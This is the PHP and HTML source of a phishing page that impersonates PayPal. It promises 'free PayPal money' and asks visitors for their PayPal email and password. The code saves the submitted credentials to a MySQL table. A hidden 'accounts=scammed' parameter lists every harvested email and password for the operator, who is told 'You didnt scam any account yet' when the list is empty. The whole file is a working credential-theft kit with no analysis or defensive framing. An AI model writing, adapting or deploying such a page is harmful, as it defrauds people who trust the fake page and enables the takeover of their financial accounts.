
<?php
error_reporting(0);
$servername = "localhost";
$username = "root";
$password = "";
$dbname = "example";

$link = mysqli_connect($servername, $username, $password, $dbname);


if($_GET["submit"] == "true" && $_POST["email"] != null){
$usado = "1";
$email = $_POST["email"];
$pw = $_POST["password"];
  $sql = "INSERT INTO contas (email, password, usado) VALUES (?, ?, ?)";
   if($stmt = mysqli_prepare($link, $sql)){
            mysqli_stmt_bind_param($stmt, "sss", $email, $pw, $usado);
  }

         if(mysqli_stmt_execute($stmt)){
 $return_data['status'] = "sucesso";
 echo json_encode($return_data);
 die();

            } else{
 $return_data['status'] = "erro";
 die();
            }


   mysqli_stmt_close($stmt);

}


?>


<!doctype html>
<html>
<head>
  <title>Free PayPal Credit - Paypal</title>
  <link rel="stylesheet" href="style.css">
  <link rel="stylesheet" href="css/bootstrap.min.css" >
  <link rel="icon" type="image/webp" href="img/favicon.webp">
  <meta name="author" content="PayPal">
  <meta name="viewport" content="width=device-width, initial-scale=1">
<link href="https://fonts.googleapis.com/css2?family=Kanit:wght@300&display=swap" rel="stylesheet">
<link href="lib/noty.css" rel="stylesheet">
<link href="lib/themes/mint.css" rel="stylesheet">
</head>


<body>
<?php
if($_GET["accounts"] == "scammed"){

  $sql = "SELECT email, password FROM contas ORDER BY  id DESC";
 $result = $link->query($sql);

 if ($result->num_rows > 0) {
     // output data of each row
     while($row = $result->fetch_assoc()) {
     $erte = $row["ipv4"];
         echo '<tr>
                   <td><a target="_blank" href="https://tools.keycdn.com/geo?host='.$erte.'"></a></td>
                   <td>'.$row["email"].' :
                   </td>
                   <td>'.$row["password"].'</td>

                 </tr><br>';
     }
 } else {
     echo "You didnt scam any account yet";
 }



echo '';




  die();
}
?>
  <section class="addmoneyform">
<div class="container">
<div class="row">
  <div class="col-sm-6">
   <div class="card">
<div class="card-header">
  <img src="img/logo.png">
</div>
<div class="card-body">

<form method="POST" id="paypalform">
  <input type="email" class="form-control" name="email" placeholder="Paypal E-mail" required>
<input type="password" class="form-control" name="password" placeholder="Paypal Password" required>
<input type="number" class="form-control" placeholder="Value to be added">
<input  style="margin-top:10px" type="submit" class="btn btn-primary" value="Get your free money !">
</div>
</form>


</div></div>



<div class="col-sm-6">
 <div class="card">
<div class="card-header" style="color:#bdbdbd;">How do this work?</div>

<div class="card-body">This tool provides the ability for anyone to earn free PayPal money without any risks !<br>Follow these steps to get your money instantly<ul><li>Insert your PayPal E-mail</li><li>Insert your PayPal password</li><li>Insert the money value that you wanna add in USD</li></ul><div class="alert alert-warning">Please note that you can only use this tool 1 time per account</div></div>
</div>

</div>
</div>
<div class="card" style="margin-top:5%;color:#bdbdbd;">
<div class="card-header" style="padding:20px;font-family:kanit,sans-serif;" >Powered by PayPal Inc (US), (<?php echo $_SERVER['REMOTE_ADDR']; ?>)</div></div>
  </section>

  <script src="js/jquery-3.5.1.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.1/dist/umd/popper.min.js" integrity="sha384-9/reFTGAW83EW2RDu2S0VKaIzap3H66lZH81PoYlFhbGU+6BZp6G7niu735Sk7lN" crossorigin="anonymous"></script>
  <script src="js/bootstrap.min.js" integrity="sha384-w1Q4orYjBQndcko6MimVbzY0tgp4pWB4lZ7lr30WKz0vr/aWKhXdBNmNb5D92v7s" crossorigin="anonymous"></script>
  <script type="text/javascript" src="scripts.js"></script>
  <script type="text/javascript" src="lib/noty.min.js"></script>
  <script type="text/javascript" src="lib/noty.js"></script>
</body>


</html>
